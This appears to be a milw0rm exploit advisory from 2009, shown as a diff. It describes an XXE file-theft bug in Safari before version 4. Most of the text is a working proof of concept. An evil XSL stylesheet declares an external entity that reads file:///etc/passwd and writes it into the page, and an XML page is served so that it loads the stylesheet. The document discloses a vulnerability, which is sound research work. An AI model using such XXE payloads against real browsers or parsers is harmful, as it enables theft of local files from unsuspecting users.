@@ -1,0 +1,42 @@
+Safari prior to version 4 may permit an evil web page to steal files
+from the local system.
+
+This is accomplished by mounting an XXE attack against the parsing of
+the XSL XML. This is best explained with a sample evil XSL file which
+includes a DTD that attempts the XXE attack:
+
+<!DOCTYPE doc [ <!ENTITY ent SYSTEM "file:///etc/passwd"> ] >
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+  <html>
+  <body>
+Below you should see the content of a local file, stolen by this evil web page.
+<p/>
+&ent;
+<script>
+alert(document.body.innerHTML);
+</script>
+  </body>
+  </html>
+</xsl:template>
+</xsl:stylesheet>
+
+To mount the attack, the attacker would serve a web page which has XML
+MIME type and requests to be styled by the evil stylesheet:
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<?xml-stylesheet type="text/xsl" href="safaristealfilebug.xsl"?>
+<xml>
+irrelevant
+</xml>
+
+Full technical details: http://scary.beasts.org/security/CESA-2009-006.html
+
+Blog post: http://scarybeastsecurity.blogspot.com/2009/06/apples-safari-4-fixes-local-file-theft.html
+(includes 1-click demos)
+
+Cheers
+Chris
+
+# milw0rm.com [2009-06-09]
